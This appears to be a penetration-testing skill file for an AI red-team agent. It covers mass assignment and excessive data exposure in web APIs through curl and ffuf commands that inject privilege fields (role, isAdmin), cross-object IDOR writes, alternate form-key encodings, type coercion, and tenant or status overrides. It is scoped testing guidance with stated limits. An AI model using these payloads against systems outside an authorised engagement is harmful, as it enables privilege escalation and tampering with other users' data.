---
name: mass-assignment
description: Test mass assignment and excessive data exposure by adding unexpected JSON/form fields, nested values, and method-specific updates one at a time
origin: RedteamOpencode
---

# Mass Assignment and Excessive Data Exposure

## When to Activate

- A profile, account, order, admin, or settings endpoint accepts `POST`, `PUT`, or `PATCH` bodies containing client-controlled fields
- Responses expose fields such as `role`, `isAdmin`, `is_staff`, `verified`, `price`, `balance`, or `email` that the client did not request

## Tools

`run_tool curl`, `run_tool ffuf`, `jq`.

## Methodology

### 1. Establish the Baseline
Use a low-privilege account and an object the tester owns. Save the request, response body, status, `Location`, `ETag`, cookies, and a read-back response; never treat an echoed input as persistence.

```bash
run_tool curl -sS --connect-timeout 5 --max-time 20 \
  -D "$DIR/scans/mass-before.headers" \
  -o "$DIR/scans/mass-before.json" "$OBJECT_URL"
```

### 2. Add Unexpected Fields One at a Time
Start with a harmless invalid value, then use one field per request. Test `role`, `isAdmin`, `is_staff`, `verified`, `price`, `balance`, and `email` separately; change the method only after the baseline is recorded.

```bash
run_tool curl -sS --connect-timeout 5 --max-time 20 -X PATCH "$OBJECT_URL" \
  -H 'Content-Type: application/json' \
  --data '{"role":"admin"}' # one unexpected field
run_tool curl -sS --connect-timeout 5 --max-time 20 -X PATCH "$OBJECT_URL" \
  -H 'Content-Type: application/json' \
  --data '{"isAdmin":true}' # one unexpected field
run_tool curl -sS --connect-timeout 5 --max-time 20 -X PATCH "$OBJECT_URL" \
  -H 'Content-Type: application/json' \
  --data '{"email":"probe@example.invalid"}' # one unexpected field
```

For each field, compare status, body, cookies, headers, and a subsequent read. Restore the original value after a disposable test, and do not bulk-submit the list.

### 3. Test Nested Objects and Arrays
Probe nested objects, arrays, and dotted forms independently. Record whether the server coerces, ignores, persists, or returns each value.

```bash
run_tool curl -sS --connect-timeout 5 --max-time 20 -X PATCH "$OBJECT_URL" \
  -H 'Content-Type: application/json' \
  --data '{"profile":{"role":"admin"}}' # nested object
run_tool curl -sS --connect-timeout 5 --max-time 20 -X PATCH "$OBJECT_URL" \
  -H 'Content-Type: application/json' \
  --data '{"roles":["user","admin"]}' # nested array
```

### 4. Compare PATCH and PUT Semantics
Use two disposable objects or restore the baseline between tests. Determine whether `PATCH` merges, `PUT` replaces, and omitted fields are preserved, zeroed, or rejected; do not infer the contract from the request method.

```bash
run_tool curl -sS --connect-timeout 5 --max-time 20 -X PATCH "$OBJECT_URL" \
  -H 'Content-Type: application/json' \
  --data '{"displayName":"probe"}' # merge-semantics check
run_tool curl -sS --connect-timeout 5 --max-time 20 -X PUT "$OBJECT_URL" \
  -H 'Content-Type: application/json' \
  --data '{"displayName":"probe"}' # replacement-semantics check
```

### 5. Exercise GraphQL and Duplicate-Key Coercion
Test GraphQL variables with one unexpected input at a time. Send a raw duplicate-key JSON body separately because a client library may normalize it before transmission; compare first-wins, last-wins, rejection, and type-coercion behavior.

```bash
run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$GRAPHQL_URL" \
  -H 'Content-Type: application/json' \
  --data-raw '{"query":"mutation Update($input: UpdateInput!){update(input:$input){id}}","variables":{"input":{"role":"admin"}}}'
run_tool curl -sS --connect-timeout 5 --max-time 20 -X PATCH "$OBJECT_URL" \
  -H 'Content-Type: application/json' \
  --data-raw '{"email":"first@example.invalid","email":"second@example.invalid"}' # duplicate JSON key
```

### 6. Combine with Object Authorization
After a normal object update is understood, repeat a single field against a second object identifier while keeping the same low-privilege identity. This tests whether mass assignment crosses an IDOR boundary; do not enumerate identifiers or access unrelated real data.

```bash
run_tool curl -sS --connect-timeout 5 --max-time 20 -X PATCH "$OTHER_OBJECT_URL" \
  -H 'Content-Type: application/json' \
  --data '{"role":"admin"}' # cross-object write check
```

### 7. Diff Accepted Fields and Capture Evidence
Replay a small candidate list one field at a time, using `run_tool ffuf` only with an engagement-scoped wordlist and a short time budget. If `ffuf` is absent, use the `run_tool curl` form below.

```bash
run_tool ffuf -u "$OBJECT_URL" -X PATCH -H 'Content-Type: application/json' \
  -d '{"FUZZ":"probe"}' -w "$DIR/wordlists/mass-fields.txt" \
  -mc 200 -t 1 -rate 1 -maxtime 20
FIELD=role
run_tool curl -sS --connect-timeout 5 --max-time 20 -X PATCH "$OBJECT_URL" \
  -H 'Content-Type: application/json' --data "{\"$FIELD\":\"probe\"}"
```

For JSON artifacts, use `jq` to sort and compare stable fields; retain raw bodies and headers. Capture the exact field, method, status, response, persisted read-back, authorization context, and whether a token, cookie, `ETag`, or `Location` changed.

### 8. Array-Index and Type-Coercion Tricks

Some frameworks bind form/query keys using bracket or dot notation that differs from the documented JSON shape — a field blocked by an allowlist on its normal path may still bind through an alternate encoding:
```
role[]=admin                     # array-wrapped scalar
user[role]=admin                 # PHP/Rails-style nested form key
user.role=admin                  # dotted form key (some Spring/Java binders)
role=admin&role=user             # duplicate form key, first/last-wins differs from JSON duplicate-key test
```
Also test type confusion on boolean/numeric guarded fields: `"isAdmin":"true"` (string) vs `"isAdmin":1` vs `"isAdmin":true` — a loosely-typed backend language may coerce a string/int the strict-typed allowlist check didn't anticipate.

### 9. Internal/Computed-Field Injection

Beyond privilege fields, target fields the server is expected to compute itself but which a lenient deserializer may accept from the client:
- Timestamps: `createdAt`, `updatedAt`, `approvedAt` — backdating or forward-dating records
- Relationship/ownership fields: `ownerId`, `userId`, `organizationId`, `tenantId` — reassigning an object to a different account/tenant on create rather than update
- State-machine fields: `status`, `state`, `workflowStage` — jumping an object directly to an approved/shipped/paid state, skipping intermediate validation steps
- Audit/version fields: `version`, `etag`, `revision` — forcing an optimistic-lock bypass

### 10. Frame Severity and Handoff
Call `role`, `isAdmin`, `is_staff`, `verified`, permissions, or tenant selection privilege escalation when authorization changes. Call `email`, `balance`, `price`, internal IDs, or broad response fields excessive data exposure when unauthorized read or persistence occurs. Combine only when evidence proves both. Keep this skill to one field and one nested or GraphQL variant per endpoint; the `exploit-developer` owns escalation chains and impact proof.

## References

`references/api-security/API01-broken-object-level-authz.md`, `references/api-security/API03-broken-property-authz.md`, `references/vuln-checklists/A01-broken-access-control.md`, `references/vuln-checklists/A06-insecure-design.md`, `references/payloads/business-logic-payloads.md`, `references/tools/fuzzing/ffuf.md`.
